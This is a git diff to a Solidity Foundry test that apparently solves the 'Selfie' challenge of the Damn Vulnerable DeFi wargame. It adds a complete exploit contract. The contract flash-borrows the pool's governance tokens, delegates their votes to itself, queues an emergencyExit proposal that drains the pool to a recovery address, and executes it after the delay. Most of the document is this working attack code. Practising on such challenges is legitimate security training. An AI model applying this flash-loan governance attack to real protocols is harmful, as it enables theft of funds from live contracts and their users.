@@ -6,6 +6,57 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
+contract SelfiePoolExploit is IERC3156FlashBorrower {
+    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
+    uint256 constant TOKENS_IN_POOL = 1_500_000e18;
+
+    DamnValuableVotes token;
+    SimpleGovernance governance;
+    SelfiePool pool;
+    address recovery;
+    uint256 actionId;
+
+    constructor(
+        address _token,
+        address _governance,
+        address _pool,
+        address _recovery
+    ) {
+        token = DamnValuableVotes(_token);
+        governance = SimpleGovernance(_governance);
+        pool = SelfiePool(_pool);
+        recovery = _recovery;
+    }
+
+    function attack() external {
+        // 1. flash loan all tokens from the pool
+        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), TOKENS_IN_POOL, "");
+
+    }
+
+    function onFlashLoan(address , address, uint256, uint256, bytes calldata) external returns (bytes32) {
+        // 2. delegate all votes to this contract
+        token.delegate(address(this));
+        
+        // 3. queue action to drain the pool
+        bytes memory emergencyActionFunction = abi.encodeWithSignature(
+            "emergencyExit(address)",
+            recovery
+        );
+        actionId = governance.queueAction(address(pool), 0, emergencyActionFunction);
+        
+        // 4. approve the pool to transfer tokens and return success message
+        token.approve(address(pool), TOKENS_IN_POOL);
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+    function executeAction() external {
+        // 5. execute action after the delay
+        governance.executeAction(actionId);
+    }
+}
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +113,15 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        SelfiePoolExploit exploit = new SelfiePoolExploit(
+            address(token),
+            address(governance),
+            address(pool),
+            recovery
+        );
+        exploit.attack();
+        vm.warp(block.timestamp + governance.getActionDelay());
+        exploit.executeAction();
     }
 
     /**
